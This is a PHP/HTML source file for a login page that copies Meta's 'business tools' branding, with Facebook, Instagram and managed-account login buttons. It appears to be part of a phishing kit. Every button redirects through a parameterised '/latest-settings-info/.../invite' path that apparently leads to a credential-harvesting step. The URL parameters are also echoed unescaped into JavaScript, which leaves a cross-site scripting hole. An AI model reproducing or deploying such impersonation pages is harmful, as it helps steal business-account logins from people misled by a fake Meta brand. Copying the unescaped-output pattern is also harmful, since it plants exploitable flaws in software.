<?php
// Get parameters from URL
$param1 = isset($_GET['param1']) ? $_GET['param1'] : '';
$param2 = isset($_GET['param2']) ? $_GET['param2'] : '';

// Function to generate links with the correct path
function generateLink($path) {
    global $param1, $param2;
    return "/latest-settings-info/{$param1}/{$param2}{$path}";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Business Tools</title>
    <link rel="icon" href="../../images/favicon.ico">
    <link rel="stylesheet" href="../../styles/style.css">
</head>

<body>
    <div class="container">
        <div class="left">
            <div class="content">
                <h1>Get started with<br>business tools from Meta</h1>
                <p>By logging in, you can navigate to all business tools like Ads Manager, Meta Business Suite, Business
                    Manager, Commerce Manager and more to help you connect with your customers and get better business
                    results.</p>
                <h4>Our business tools can help you:</h4>
                <ul>
                    <li>Spread the word about your business to increase brand awareness</li>
                    <li>Attract new customers, grow your client base and build customer relationships</li>
                    <li>Increase your online sales by reaching new audiences</li>
                </ul>
            </div>
        </div>
        <div class="mid">
            <img src="../../images/home-mid.png" alt="Business Tools" class="mid-image">
        </div>
        <div class="right">
            <div class="login-container">
                <h2>Log into business tools</h2>
                <button class="fb-btn" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">
                    <i class="fab fa-facebook fb-btn-icon"></i> Log in with Facebook </button>
                <button class="ig-btn" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">
                    <i class="fab fa-instagram ig-btn-icon"></i> Log in with Instagram </button>
                <p class="managed" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">Log in with a managed account</p>
            </div>
        </div>
    </div>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="../../scripts/script.js"></script>
</body>

</html>